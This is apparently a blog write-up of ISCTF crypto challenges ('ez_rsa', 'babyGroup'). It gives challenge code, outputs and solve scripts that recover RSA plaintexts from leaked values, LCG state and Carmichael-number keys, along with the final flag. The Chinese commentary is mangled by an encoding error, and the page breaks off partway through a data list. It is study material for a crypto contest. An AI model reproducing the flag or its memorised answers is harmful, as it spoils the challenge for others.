<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint,getrandbits</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> factorial <span class="keyword">as</span> factor</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime <span class="keyword">as</span> is_strongPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">step1</span>(<span class="params">m</span>):</span><br><span class="line">	p,q = getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>)</span><br><span class="line">	n=p*q</span><br><span class="line">	e=getPrime(<span class="number">512</span>)</span><br><span class="line">	phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">while</span> gcd(e,phi) != <span class="number">1</span>:</span><br><span class="line">		e=getPrime(<span class="number">512</span>)</span><br><span class="line">	d = <span class="built_in">pow</span>(e,-<span class="number">1</span>,phi)</span><br><span class="line">	k = randint(<span class="number">800</span>,<span class="number">1500</span>)</span><br><span class="line">	f = factor(k)</span><br><span class="line">	leak = (<span class="built_in">pow</span>(e, <span class="number">2</span>) + (e*d - <span class="number">1</span>)*f)*getPrime(<span class="number">256</span>) + k</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n=&#125;</span>&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;leak=&#125;</span>&quot;</span>)</span><br><span class="line">	e = <span class="number">65537</span></span><br><span class="line">	c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">	<span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">step2</span>(<span class="params">m</span>):</span><br><span class="line"></span><br><span class="line">	<span class="keyword">assert</span> key &lt; <span class="number">10</span>**<span class="number">9</span></span><br><span class="line">	<span class="keyword">assert</span> (is_prime(key) <span class="keyword">and</span> <span class="keyword">not</span> is_strongPrime(key))</span><br><span class="line"></span><br><span class="line">	p,q = getPrime(<span class="number">512</span>),getPrime(<span class="number">512</span>)</span><br><span class="line">	n=p*q</span><br><span class="line">	leak1 = <span class="built_in">pow</span>(p,q,n) + <span class="built_in">pow</span>(q,p,n)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n=&#125;</span>&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;leak1=&#125;</span>&quot;</span>)</span><br><span class="line">	e=<span class="number">0x10001</span></span><br><span class="line">	c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">	seed = getrandbits(<span class="number">64</span>)</span><br><span class="line">	a = getPrime(<span class="number">256</span>)</span><br><span class="line">	b = getPrime(<span class="number">256</span>)</span><br><span class="line">	leak2 = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">		leak2.append(seed := (seed * a + b) % p)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;leak2 = &#125;</span>&quot;</span>)</span><br><span class="line">	seed = (seed * a + b) % p</span><br><span class="line">	base = key ^ seed</span><br><span class="line">	final = []</span><br><span class="line">	<span class="keyword">while</span> c &gt; <span class="number">0</span>:</span><br><span class="line">		final.append(c % base)</span><br><span class="line">		c //= base</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">p</span>):</span><br><span class="line">	check = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>]</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">all</span>([<span class="built_in">pow</span>(i,p-<span class="number">1</span>,p)==<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> check])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">	<span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">2</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;step1:&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,step1(s2n(flag[<span class="number">0</span>])))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;step2:&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;final =&quot;</span>,step2(s2n(flag[<span class="number">1</span>])))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">step1:</span><br><span class="line">n=<span class="number">11947241219140615237486309604628973391930339499486798714294498785973885463922548820705069266901903036359254530976927762175262118185159625298369758973935607721381080656199430417818042316007700805008489750740972102287526203064312544340176751751266738219862839022892152635044837041435349904947659346174437695051460882295109851494351994498403791853684239883961766735230202016890875913906900424655711952381425165331389205409282026144667620577946333963601349932905443037145145394667138672752796990411249984169798953060016353748467221154507518574580014882822860853751863757579945329482337792853278715658322366578632817369803</span></span><br><span class="line">leak=<span class="number">4825516411405566882589539973300777582630401687252523937619475044718073214792109569356301252345907914527064817796240727881691399437316660502564323688151311441558823720142071322647007043253626474853010585775710666373651910201889816367922377400970334479040370865879692204764210349607801862666059991789964453439198722962928173197103040385999540054988070333338229570681105393323319767364566644771731595597298210924296456293443125736685469259629163687986114207231233692023613120260155832741199446052855856512791809968963821161765216500389495853488545132008219841635172896843241988125093920217328861507191614658581776695350233593334984646128341640512614300048002219790302478025661133721688232990437685571940604588227022076092857294647830142309441330515812342199940466483115991318018705011472671758063610572930560763516803732693572940939851140384123593105367117155740563057395940645038058194280259524467405820813428765139386968927021061208348111646257434870000866555555283176852834141906387086839051793789126474095527358879630274092172435022326207193319806666865704778907868548658370890623182731938070419969709739233504224100413506514936517272134494776127809327563935813198793891897000404156963455000732616317276241867836699641699825594195079194154957636030485909612033254350828892222046169586844737908349421869385194421981553067305581842171364022745759111602699744161574724372962242132415149146766136601016174658042678857388889036814591399168640678928083442174651493660991088328784105160030857387096251561933704301600695757426945716557961698202485226605485682131045560193822624290720243852434254301324766198129736640005205530445739302632191151740246117208267182630330046600955724262084795763080838384593939971523865769318326101179866187596006185138294477350533316908592086441208575935282494961976691089358976722199557082176285926812134290542838960814502829473372780200310674359645482281037654052483716329497333729594792122297988611883754886634452292313599416610842690057657285337854049766320641249317238780428383587602425132767334811708075065922641191109650660427678019567095309270443930385437292172296652003394183918270707887845018685247162812541929998945735270109736669595830167257239265204520272132384023622231518288514767919183916561550558812478144292894132331163501566746036390319663066054892756826660841952717280005731719082266616429646501565960817772663658546555336959754321712751857740551378987853931613973604348308746819562341219749677392565068390386908064199536445684309718116754288299091975226013592388160308117145043236992250577771659408413506586402897189336742792418163003231783947003853396754144599319566763313339145462208172531322682800226151072022731913191728047323245146556315571396082728252085753230639541374982105041248659074695696205654079837224195868428271353983820725017250413714060967825638577327604252122887136259380946072629481202720339169708229866846597577227829317443910036825722430374711816074735238082313198164126791797947010044130222158124667234003098164746100341636238823175289796896896408971518797835906067939914494546110471749352544064300485882179448030898818405400902242119590645639910708635188342567159795613212660990908765619684401061336405049960091659288716162966504703741105477420409053115823924764680153604215949521605456710353305498258615912458036292507652321420277318757146737030628878096962452278346772976364597137682209395761868224382621093921689415088745975049380393255899867417274843474628482169247388041616142896804170033688742622605192409970919836724035274730923747265191248135577704760607590</span></span><br><span class="line">c = <span class="number">4058526944014006069084945174812818814825704864122299028618329411106188952604728150732223145114766938864644072527523082946069975859381918224872075058517683896020489424720005770218969436595364473179601299857281520204212872074837132357469599147175121200219338329188718982224238281009625352190581095607599976922610436817213692622671732783554216636941121695116377777616027462234472833366922829073660312229117800995468022619934881890343086653577149166193139948443894324239522101581089953817527886638425552917578146958961373353776642091545344162923084513872918786615317499139918810812014781753970806739855831453833956364967</span></span><br><span class="line"></span><br><span class="line">step2:</span><br><span class="line">n=<span class="number">138222025039224144545251830624229986468723531196582463907557734108529994926504669875900898789473948111199016914847829105939167293515822413866727879262875702026534563930475309506834431656926222982363543666448736091756871792887144283877167509418070979449484508499296324616988840431116233637168977730122017878289</span></span><br><span class="line">leak1=<span class="number">23535059927033628406212169278224758389583882623183004031205822980722154537430761635153622180505243837027568034322858038302626132200979370182327110682738910</span></span><br><span class="line">leak2 = [<span class="number">362437850887271063413256292444148642949623196635276044583204094265607936120337004605360832421011</span>, <span class="number">1932915843524327487337992118762711929552569713433223514001673251237692307587356544615955431611435994003602897830069566867051943572065473955405337889221398</span>, <span class="number">11222178024143398739150445814520244630341642052876364179793404105841311693968292227072031763726153574031884490677131749512430325919668649359617953965112844</span>, <span class="number">5408933876805830533113961512210040977462510675785228477646978801328722923647434079128879371684477664804744431834418916837956820965870203842552250165916773</span>, <span class="number">1447143741705069323823257922715038721270982554690635708441585728089036094805730054505696492295730683300002193478561819037345041940787115528445592303142510</span>, <span class="number">3707657531268843465369646969917923274507341341483950204025637357600814449263032574496424566705812439915548150679438579110456264431525526309588664326456861</span>, <span class="number">9263925820149827740182684692442727161206242182976684575667062235695526783971703826794731732152445051579616121306722939129265340347908823003172137299057843</span>, <span class="number">207494591333501391015462321304802957885928775185602834554977737560856036337667840127810136802887548047878444936730742505483927963807357904024967768148122</span>, <span class="number">7052936859446617933917872361389151092893299250603966165472023802877016733939957851026719428770748111897050866474067880613419756475700748999497496482278608</span>, <span class="number">1169538791889404037461397919075674424569430764451305755000680272926397357803359328850780774937432248011264334398346178303234064891680342161511829008635621</span>]</span><br><span class="line">final = [<span class="number">2268617516274900905319941795987877533673889507146326516564545408684476960310333170888941124460992562245780101836116975666368936099249664924148379487909122</span>, <span class="number">1445275952377746701088629016221431744592935398639655895336779954310077866709012082302847692239730041591520169244063854849129773530127510048494782550102381</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure>

<p>å…¶å®é¢˜ç›®å‡ºçš„æŒºå¥½çš„<del>å‚»é€¼çš„æˆ‘èµ›æ—¶æ²¡åšå‡ºæ¥</del><br>ä¸¤éƒ¨åˆ†<br>PART1:<br>ç»™äº†leakçš„ä¸€ä¸ªè¡¨è¾¾å¼ è¿™é‡Œè¦æ³¨æ„åˆ° k! éå¸¸çš„å¤§<br>æ‰€ä»¥ x &#x3D; (leak-k)&#x2F;&#x2F;k! â‰ˆ (ed-1)xgetprime(256)<br>ç„¶åæˆ‘ä»¬é€šè¿‡ gcd(leak-k,x) &#x3D;&gt; getprime(256)<br>è¿›è€Œå¯ä»¥å¾—åˆ° ed-1 &#x3D;&gt; kÃ—phi<br>è¿™é‡Œå¾—åˆ°ed-1è¦ç²¾ç¡®æ¢å¤</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">800</span>,<span class="number">1500</span>):</span><br><span class="line">    fact = factorial(k)</span><br><span class="line">    ed_1_prime256 = (leak-k)//fact</span><br><span class="line">    prime256 = <span class="built_in">int</span>(gcd(ed_1_prime256,leak-k))</span><br><span class="line">    <span class="keyword">if</span> prime256.bit_length()&gt;=<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;k= <span class="subst">&#123;k&#125;</span>\nprime256= <span class="subst">&#123;prime256&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°äº†kphiå…¶å®ç›´æ¥æ±‚eç›¸å¯¹kphiçš„é€†å…ƒä½œä¸ºdå°±èƒ½è§£RSAäº†(<del>å­¦ç¾¤è®ºååŸºç¡€æ•°è®ºå¿˜äº†å¥½å¤š</del>)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">k= <span class="number">1039</span></span><br><span class="line">prime256= <span class="number">108265111455950860152587704451025053167231031155722144225275801978438974863031</span></span><br><span class="line">f = factorial(k)</span><br><span class="line">e_2_prime256 = (leak-k)%f</span><br><span class="line">ed_1 = (leak-k-e_2_prime256)//(f*prime256)</span><br><span class="line">kphi = ed_1</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">e = <span class="built_in">int</span>(e)</span><br><span class="line">kphi = <span class="built_in">int</span>(kphi)</span><br><span class="line">d = modinv(e,kphi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment"># b&#x27;ISCTF&#123;yOu_kn0W_RSAgcd_and_g0Od_at&#x27;</span></span><br></pre></td></tr></table></figure>

<p>PART2:<br>æ³¨æ„åˆ°è¿™ä¸ªkeyçš„ç”Ÿæˆæ–¹å¼ å¯ä»¥å‘ç°ç¬¦åˆå¡è¿ˆå…‹å°”æ•°çš„ç‰¹æ€§ æŸ¥è¡¨ or çˆ†ç ´éƒ½è¡Œ<br>ç»™çš„leak1å…¶å®å°±æ˜¯ç»™çš„p+q solveè§£ä¸€ä¸‹å³å¯<br>ç„¶åå°±æ˜¯LCGæ¢å¤a,b è¿™é‡Œæ³¨æ„ï¼ p,qæ¢ä¸€æ¢è¯•ä¸€è¯•ã€‚ã€‚ã€‚ æˆ‘ä¸€ç›´ä»¥ç¬¬ä¸€ä¸ªè§£å‡ºçš„p ç»“æœä¸€ç›´LCGæ¢å¤ä¸å¯¹ åé¢ä¸€çœ‹ é¢˜ç›®æ²¡è§„å®šé¡ºåºâ€¦<del>éš¾ç»·</del></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">p,q = q,p</span><br><span class="line">a = (leak2[-<span class="number">1</span>]-leak2[-<span class="number">2</span>])*modinv(leak2[-<span class="number">2</span>]-leak2[-<span class="number">3</span>],p)%p</span><br><span class="line">b = (leak2[-<span class="number">1</span>]-a*leak2[-<span class="number">2</span>])%p</span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line">seed = a*leak2[-<span class="number">1</span>]+b</span><br><span class="line">seed %= p</span><br><span class="line">base = seed^key</span><br><span class="line">c=base*(final[<span class="number">1</span>]+final[<span class="number">2</span>]*base)+final[<span class="number">0</span>]</span><br><span class="line">d = modinv(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;_LCG_also_like_Carmichael_number&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>flag: ISCTF{yOu_kn0W_RSAgcd_and_g0Od_at_LCG_also_like_Carmichael_number}</p>
<h2 id="babyGroup"><a href="#babyGroup" class="headerlink" title="babyGroup"></a>babyGroup</h2><p>Per.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,sqrt,gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">P</span>:</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data</span>):</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">int</span>:</span><br><span class="line">			self.size = data</span><br><span class="line">			self._<span class="built_in">list</span> = [i+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.size)]</span><br><span class="line">			self._initialize()			</span><br><span class="line">		<span class="keyword">elif</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">list</span>:</span><br><span class="line">			self._<span class="built_in">list</span> = data</span><br><span class="line">			self.size = <span class="built_in">len</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, other</span>):</span><br><span class="line">		<span class="keyword">return</span> P(self._iterList(self.getList(),other.getList()))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">str</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">len</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, other</span>):</span><br><span class="line">		tempList = self._<span class="built_in">list</span></span><br><span class="line">		<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,other):</span><br><span class="line">			tempList = self._iterList(tempList, tempList)</span><br><span class="line">		<span class="keyword">return</span> P(tempList)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">str</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">getList</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> self._<span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">_initialize</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">			random.shuffle(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">_iterList</span>(<span class="params">self, List1,List2</span>):</span><br><span class="line">		new_list = []</span><br><span class="line">		<span class="keyword">for</span> elem <span class="keyword">in</span> List1:</span><br><span class="line">			new_list.append(List2[elem - <span class="number">1</span>])</span><br><span class="line">		<span class="keyword">return</span> new_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>():</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			self.q = random.getrandbits(<span class="number">2048</span>)</span><br><span class="line">			self.f = random.randint(<span class="number">1</span>, sqrt(self.q // <span class="number">2</span>))</span><br><span class="line">			self.g = random.randint(sqrt(self.q // <span class="number">4</span>), sqrt(self.q // <span class="number">2</span>))</span><br><span class="line">			<span class="keyword">if</span> gcd(self.f, self.q * self.g) == <span class="number">1</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		self.h = invert(self.f, self.q) * self.g % self.q</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">getPublicKey</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> (<span class="built_in">int</span>(self.q), <span class="built_in">int</span>(self.h))</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">self, m</span>):</span><br><span class="line">		<span class="keyword">assert</span> m &lt; sqrt(self.q//<span class="number">4</span>)</span><br><span class="line">		r = random.randint(<span class="number">1</span>, sqrt(self.q // <span class="number">2</span>))</span><br><span class="line">		e = (r * self.h + m) % self.q</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">int</span>(e)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">self, e</span>):</span><br><span class="line">		a = self.f * e % self.q</span><br><span class="line">		b = invert(self.f, self.g) * a % self.g</span><br><span class="line">		<span class="keyword">return</span> b</span><br></pre></td></tr></table></figure>
<p>task.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Per <span class="keyword">import</span> P,Block</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"></span><br><span class="line">mask = P(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mask**<span class="number">2</span>)</span><br><span class="line">mask_hash = hashlib.sha512(<span class="built_in">str</span>(mask).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the mask hash is:&quot;</span> + mask_hash)</span><br><span class="line"></span><br><span class="line">mul = P(<span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;mul=&#125;</span>&quot;</span>)</span><br><span class="line">temp = hashlib.sha512(<span class="built_in">str</span>(mask * mul).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">msg = s2n(flag) ^ <span class="built_in">int</span>(temp,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">worker = Block()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;pubkey(q,h):<span class="subst">&#123;worker.getPublicKey()&#125;</span>&quot;</span>)</span><br><span class="line">c = worker.enc(msg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c=&#125;</span>&quot;</span>)</span><br><span class="line">dec = worker.dec(c)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>output</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">82</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">200</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">4</span>, <span class="number">147</span>, <span class="number">171</span>, <span class="number">152</span>, <span class="number">193</span>, <span class="number">19</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">186</span>, <span class="number">8</span>, <span class="number">124</span>, <span class="number">159</span>, <span class="number">225</span>, <span class="number">6</span>, <span class="number">180</span>, <span class="number">125</span>, <span class="number">74</span>, <span class="number">14</span>, <span class="number">255</span>, <span class="number">60</span>, <span class="number">187</span>, <span class="number">132</span>, <span class="number">222</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">79</span>, <span class="number">57</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">72</span>, <span class="number">197</span>, <span class="number">201</span>, <span class="number">191</span>, <span class="number">75</span>, <span class="number">38</span>, <span class="number">135</span>, <span class="number">177</span>, <span class="number">165</span>, <span class="number">149</span>, <span class="number">17</span>, <span class="number">172</span>, <span class="number">173</span>, <span class="number">59</span>, <span class="number">210</span>, <span class="number">108</span>, <span class="number">31</span>, <span class="number">142</span>, <span class="number">163</span>, <span class="number">227</span>, <span class="number">178</span>, <span class="number">226</span>, <span class="number">73</span>, <span class="number">256</span>, <span class="number">190</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">238</span>, <span class="number">129</span>, <span class="number">157</span>, <span class="number">219</span>, <span class="number">131</span>, <span class="number">67</span>, <span class="number">28</span>, <span class="number">68</span>, <span class="number">236</span>, <span class="number">168</span>, <span class="number">209</span>, <span class="number">245</span>, <span class="number">93</span>, <span class="number">61</span>, <span class="number">122</span>, <span class="number">208</span>, <span class="number">137</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">111</span>, <span class="number">18</span>, <span class="number">161</span>, <span class="number">106</span>, <span class="number">54</span>, <span class="number">175</span>, <span class="number">70</span>, <span class="number">16</span>, <span class="number">110</span>, <span class="number">5</span>, <span class="number">218</span>, <span class="number">81</span>, <span class="number">233</span>, <span class="number">45</span>, <span class="number">91</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">104</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">228</span>, <span class="number">248</span>, <span class="number">150</span>, <span class="number">176</span>, <span class="number">167</span>, <span class="number">35</span>, <span class="number">130</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">42</span>, <span class="number">169</span>, <span class="number">232</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">205</span>, <span class="number">9</span>, <span class="number">235</span>, <span class="number">97</span>, <span class="number">84</span>, <span class="number">246</span>, <span class="number">36</span>, <span class="number">76</span>, <span class="number">240</span>, <span class="number">52</span>, <span class="number">144</span>, <span class="number">98</span>, <span class="number">86</span>, <span class="number">99</span>, <span class="number">21</span>, <span class="number">64</span>, <span class="number">217</span>, <span class="number">15</span>, <span class="number">202</span>, <span class="number">206</span>, <span class="number">55</span>, <span class="number">244</span>, <span class="number">65</span>, <span class="number">23</span>, <span class="number">53</span>, <span class="number">250</span>, <span class="number">78</span>, <span class="number">22</span>, <span class="number">215</span>, <span class="number">25</span>, <span class="number">66</span>, <span class="number">143</span>, <span class="number">107</span>, <span class="number">195</span>, <span class="number">80</span>, <span class="number">196</span>, <span class="number">254</span>, <span class="number">174</span>, <span class="number">33</span>, <span class="number">162</span>, <span class="number">252</span>, <span class="number">141</span>, <span class="number">153</span>, <span class="number">43</span>, <span class="number">185</span>, <span class="number">211</span>, <span class="number">220</span>, <span class="number">115</span>, <span class="number">127</span>, <span class="number">216</span>, <span class="number">251</span>, <span class="number">139</span>, <span class="number">95</span>, <span class="number">146</span>, <span class="number">48</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">199</span>, <span class="number">13</span>, <span class="number">160</span>, <span class="number">90</span>, <span class="number">223</span>, <span class="number">123</span>, <span class="number">181</span>, <span class="number">120</span>, <span class="number">164</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">128</span>, <span class="number">192</span>, <span class="number">249</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">207</span>, <span class="number">71</span>, <span class="number">182</span>, <span class="number">145</span>, <span class="number">62</span>, <span class="number">3</span>, <span class="number">92</span>, <span class="number">183</span>, <span class="number">194</span>, <span class="number">100</span>, <span class="number">24</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="number">117</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">140</span>, <span class="number">166</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">189</span>, <span class="number">63</span>, <span class="number">46</span>, <span class="number">58</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">47</span>, <span class="number">154</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">40</span>, <span class="number">26</span>, <span class="number">243</span>, <span class="number">253</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">105</span>, <span class="number">155</span>, <span class="number">138</span>, <span class="number">1</span>, <span class="number">212</span>, <span class="number">20</span>, <span class="number">203</span>, <span class="number">213</span>, <span class="number">198</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">109</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">221</span>, <span class="number">113</span>, <span class="number">96</span>, <span class="number">204</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">the mask <span class="built_in">hash</span> <span class="keyword">is</span>:91881f508f08fbafec1a6879fc3a1f215135c94c78f03fae8534d54dc05bd4a122a4e4508d32b9e02be08fbbb42a9e3335fc433c20e2da2e012d11b7324f6952</span><br><span class="line"></span><br><span class="line">mul=[<span class="number">114</span>, <span class="number">189</span>, <span class="number">92</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">161</span>, <span class="number">202</span>, <span class="number">250</span>, <span class="number">131</span>, <span class="number">9</span>, <span class="number">111</span>, <span class="number">226</span>, <span class="number">223</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">99</span>, <span class="number">208</span>, <span class="number">195</span>, <span class="number">216</span>, <span class="number">141</span>, <span class="number">116</span>, <span class="number">167</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">129</span>, <span class="number">15</span>, <span class="number">158</span>, <span class="number">178</span>, <span class="number">197</span>, <span class="number">4</span>, <span class="number">187</span>, <span class="number">27</span>, <span class="number">200</span>, <span class="number">144</span>, <span class="number">76</span>, <span class="number">74</span>, <span class="number">154</span>, <span class="number">86</span>, <span class="number">249</span>, <span class="number">93</span>, <span class="number">112</span>, <span class="number">46</span>, <span class="number">104</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">40</span>, <span class="number">225</span>, <span class="number">38</span>, <span class="number">98</span>, <span class="number">186</span>, <span class="number">169</span>, <span class="number">64</span>, <span 